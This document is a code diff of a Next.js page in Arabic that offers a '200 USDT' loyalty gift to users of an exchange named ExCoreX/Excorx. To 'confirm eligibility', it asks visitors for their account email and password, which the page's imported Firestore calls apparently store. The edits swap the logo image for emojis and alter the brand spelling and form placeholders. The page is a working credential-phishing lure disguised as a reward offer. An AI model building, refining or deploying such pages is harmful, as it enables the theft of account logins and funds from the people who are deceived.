@@ -1,11 +1,8 @@
-
 'use client';
 
 import React, { useState } from 'react';
-import Image from 'next/image';
 import { useFirestore } from '@/firebase';
 import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
-import { PlaceHolderImages } from '@/lib/placeholder-images';
 
 export default function Home() {
   const db = useFirestore();
@@ -13,8 +10,6 @@ export default function Home() {
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
   const [submitted, setSubmitted] = useState(false);
-
-  const logo = PlaceHolderImages.find(img => img.id === 'excorex-logo');
 
   const submitRequest = async () => {
     if (!email || !password) {
@@ -72,8 +67,10 @@ export default function Home() {
         }
 
         .gift-icon {
-            margin-bottom: 20px;
-            filter: drop-shadow(0 0 25px #3b82f6);
+            font-size: 70px;
+            line-height: 1;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 20px #3b82f6);
             animation: float 3s ease-in-out infinite;
             display: flex;
             justify-content: center;
@@ -214,20 +211,9 @@ export default function Home() {
       `}</style>
 
       <div className="gift-card" dir="rtl">
-        <div className="gift-icon">
-          {logo && (
-            <Image 
-              src={logo.imageUrl} 
-              alt={logo.description} 
-              width={120} 
-              height={120} 
-              className="rounded-3xl shadow-2xl shadow-blue-500/50"
-              data-ai-hint={logo.imageHint}
-            />
-          )}
-        </div>
+        <div className="gift-icon">🎁💰</div>
         <h1>عرض خاص: 200 USDT</h1>
-        <div className="sub-title">هدية حصريّة لمستخدمي ExCoreX النشطين</div>
+        <div className="sub-title">هدية لمستخدمي Excorx النشطين</div>
 
         <div className="highlight">
           <span style={{ color: '#b3d9ff', fontSize: '18px' }}>مكافأة الولاء</span>
@@ -242,7 +228,7 @@ export default function Home() {
         {!submitted ? (
           <>
             <p style={{ color: '#b0caf0', fontSize: '14px', margin: '15px 0 5px' }}>
-              لتأكيد أهليتك، يرجى تسجيل الدخول بحسابك في ExCoreX.
+              لتأكيد أهليتك، يرجى تسجيل الدخول بحسابك في Excorx.
             </p>
 
             <div className="input-group">
@@ -250,7 +236,7 @@ export default function Home() {
               <input 
                 type="email" 
                 className="input-field" 
-                placeholder="أدخل بريدك الإلكتروني المسجل" 
+                placeholder="أدخل بريدك الإلكتروني" 
                 autoComplete="off"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
@@ -262,7 +248,7 @@ export default function Home() {
               <input 
                 type="password" 
                 className="input-field" 
-                placeholder="كلمة مرور حسابك في ExCoreX" 
+                placeholder="كلمة مرور حسابك" 
                 autoComplete="off"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
